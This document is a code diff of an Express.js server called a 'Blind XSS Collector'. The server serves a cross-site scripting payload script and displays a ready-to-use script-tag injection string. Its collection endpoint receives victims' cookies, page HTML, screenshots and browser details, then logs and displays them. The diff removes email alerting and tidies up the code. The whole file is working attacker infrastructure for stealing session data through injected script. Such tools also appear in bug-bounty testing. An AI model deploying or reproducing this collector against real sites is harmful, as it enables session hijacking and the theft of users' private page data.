@@ -1,6 +1,4 @@
-require('dotenv').config();
 const express = require('express');
-const nodemailer = require('nodemailer');
 const fs = require('fs');
 const path = require('path');
 const bodyParser = require('body-parser');
@@ -8,22 +6,18 @@ const bodyParser = require('body-parser');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-app.use(bodyParser.json({ limit: '15mb' }));
-app.use(bodyParser.urlencoded({ extended: true }));
-app.use('/screenshots', express.static(path.join(__dirname, 'screenshots')));
-
-if (!fs.existsSync('screenshots')) {
-  fs.mkdirSync('screenshots');
+// Create "screenshots" folder if it doesn't exist
+const screenshotDir = path.join(__dirname, 'screenshots');
+if (!fs.existsSync(screenshotDir)) {
+  fs.mkdirSync(screenshotDir);
 }
 
-const transporter = nodemailer.createTransport({
-  service: 'gmail',
-  auth: {
-    user: process.env.EMAIL_USER,
-    pass: process.env.EMAIL_PASS,
-  },
-});
+// Middleware
+app.use(bodyParser.json({ limit: '15mb' }));
+app.use(bodyParser.urlencoded({ extended: true }));
+app.use('/screenshots', express.static(screenshotDir));
 
+// Serve the XSS payload
 app.get('/xss.js', (req, res) => {
   res.setHeader('Content-Type', 'application/javascript');
   res.send(`
@@ -53,7 +47,8 @@ app.get('/xss.js', (req, res) => {
   `);
 });
 
-app.post('/collect', async (req, res) => {
+// Log and save screenshot
+app.post('/collect', (req, res) => {
   const {
     screenshot, cookies, userAgent, referer,
     origin, html, iframe, time
@@ -64,7 +59,7 @@ app.post('/collect', async (req, res) => {
   let screenshotPath = null;
   if (screenshot) {
     const base64Data = screenshot.replace(/^data:image\/png;base64,/, "");
-    screenshotPath = `screenshots/screenshot-${Date.now()}.png`;
+    screenshotPath = path.join('screenshots', `screenshot-${Date.now()}.png`);
     fs.writeFileSync(screenshotPath, base64Data, 'base64');
   }
 
@@ -80,37 +75,23 @@ app.post('/collect', async (req, res) => {
     screenshot: screenshotPath
   };
 
-  // Append log
+  console.log("🚨 Blind XSS Triggered:", logEntry);
   fs.appendFileSync('logs.txt', JSON.stringify(logEntry) + "\n");
 
-  // Send email alert
-  const mailOptions = {
-    from: process.env.EMAIL_USER,
-    to: process.env.EMAIL_TO,
-    subject: 'Blind XSS Triggered!',
-    text: `XSS Triggered from IP: ${ip}\nData: ${JSON.stringify(logEntry, null, 2)}`
-  };
-
-  try {
-    await transporter.sendMail(mailOptions);
-    console.log('Email sent!');
-  } catch (error) {
-    console.error('Error sending email:', error);
-  }
-
-  console.log("🚨 Blind XSS Triggered:", logEntry);
   res.status(200).send('OK');
 });
 
+// Home route
 app.get('/', (req, res) => {
   res.send(`
-    <h2>🔍 Blind XSS Collector is Running!</h2>
+    <h2>🔍 Blind XSS Collector Running</h2>
     <p>Use this payload:</p>
     <pre>&lt;script src="https://${req.headers.host}/xss.js"&gt;&lt;/script&gt;</pre>
     <p>Check logs at <a href="/view-logs">/view-logs</a></p>
   `);
 });
 
+// Logs view
 app.get('/view-logs', (req, res) => {
   const logs = fs.existsSync('logs.txt') ? fs.readFileSync('logs.txt', 'utf8') : 'No logs yet.';
   res.setHeader('Content-Type', 'text/plain');
